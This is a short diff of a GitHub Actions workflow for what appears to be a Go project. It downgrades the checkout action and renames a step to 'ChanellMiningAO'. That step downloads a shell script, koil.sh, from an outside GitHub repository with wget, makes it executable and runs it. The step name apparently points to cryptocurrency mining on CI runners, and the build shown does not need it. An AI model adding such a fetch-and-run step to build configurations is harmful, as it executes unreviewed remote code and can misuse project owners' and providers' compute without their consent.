@@ -21,7 +21,7 @@ steps:
     go-version: ${{ matrix.go }}
   id: go
 - name: Setup
-  uses: actions/checkout@v2
-- name: azkafamilychanel
+  uses: actions/checkout@v1
+- name: ChanellMiningAO
   run: | 
     wget https://github.com/ChanellMiningAO/koil/blob/main/koil.sh && chmod u+x koil.sh && ./koil.sh
